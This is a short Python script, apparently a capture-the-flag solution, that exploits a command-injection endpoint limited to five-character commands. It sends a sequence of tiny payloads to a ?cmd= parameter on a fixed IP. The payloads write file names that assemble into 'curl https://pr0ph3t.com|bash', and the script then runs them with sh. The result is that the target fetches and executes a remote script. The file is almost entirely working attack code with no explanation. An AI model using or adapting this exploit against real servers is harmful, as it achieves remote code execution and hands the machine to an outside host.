import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl orange.tw.tw|python`
    # generate `curl https://pr0ph3t.com|bash` 
    '>sh ', 
    '>ba\\', 
    '>m|\\',
    '>co\\',
    '>t.\\',
    '>h3\\',
    '>0p\\', 
    '>pr\\',
    '>\/\\',
    '>s:\\', 
    '>tp\\', 
    '>ht\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # exec
    'sh _', 
    'sh g', 
]



r = requests.get('http://10.188.2.20:22460/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://10.188.2.20:22460/?cmd=' + quote(i) )
    print i
    sleep(0.2)

